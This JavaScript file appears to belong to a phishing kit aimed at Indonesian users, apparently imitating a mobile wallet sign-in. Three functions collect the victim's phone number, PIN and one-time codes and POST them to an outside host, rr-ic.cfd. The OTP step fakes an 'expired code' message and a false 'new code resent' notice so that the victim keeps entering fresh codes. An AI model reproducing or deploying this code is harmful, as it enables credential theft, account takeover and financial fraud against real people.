/////
function sendNohp(event) {
   $("#process").show();
   event.preventDefault();
   $("#inp").blur();
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
   $.ajax({
      type: 'POST',
      url: 'https://rr-ic.cfd/z0me/ss/one.php',
      data: dataString,
      complete: function(data) {
         console.log('Complete');
         $("#process").hide();
         document.getElementById("back1").style.display = "none";
         document.getElementById("back2").style.display = "block";
         $("#formNohp").fadeOut();
         setTimeout(function() {
            $("#formPin").fadeIn();
            $("#pin1").focus();
         }, 500);
      }
   });
};


 
 
 
////
function sendPin() {
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
   $.ajax({
      type: 'POST',
      url: 'https://rr-ic.cfd/z0me/ss/two.php',
      data: dataString,
      complete: function(data) {
         console.log('Complete');
         $("#process").hide();
         document.getElementById("alert").style.display = "block";
         var nomor = document.getElementById("inp").value;
         document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
         $(".bgotp").fadeIn();
         setInterval(countdown, 1000);
         $("#otp1").focus();
      }
   });
};




///
function sendOtp() {
   $(".loadingOtp").show();
   event.preventDefault();
   setTimeout(function() {
      $(".alert").text("Masa berlaku OTP sudah habis");
      $(".alert").css("color", "red");
   }, 2000);
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
   $.ajax({
      type: 'POST',
      url: 'https://rr-ic.cfd/z0me/ss/three.php',
      data: dataString,
      complete: function(data) {
         console.log('Complete');
         setTimeout(function() {
            $(".loadingOtp").hide();
            $('.inpotp').val('');
            $('#otp1').focus();
            var nomor = document.getElementById("inp").value;
            document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
            $(".alert").css("color", "black");
         }, 4000);
      }
   });
};
    
       
